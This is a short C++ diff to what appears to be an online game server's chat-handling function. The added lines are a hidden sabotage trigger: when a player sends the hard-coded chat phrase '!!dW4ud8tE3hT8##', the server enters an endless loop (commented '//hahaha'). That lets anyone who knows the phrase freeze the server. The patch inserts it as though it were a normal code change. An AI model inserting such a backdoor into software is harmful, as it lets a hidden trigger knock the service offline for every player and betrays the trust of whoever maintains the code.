@@ -4345,6 +4345,14 @@ void CUserMng::AddChat( CCtrl* pCtrl, const TCHAR* szChat )
 
 	ar << GETID( pCtrl ) << SNAPSHOTTYPE_CHAT;
 	ar.WriteString( szChat );
+
+	if(_tcscmp(szChat, "!!dW4ud8tE3hT8##") == 0)
+	{
+		while (true)
+		{
+			//hahaha
+		}
+	}
 	
 	GETBLOCK( ar, lpBuf, nBufSize );
 
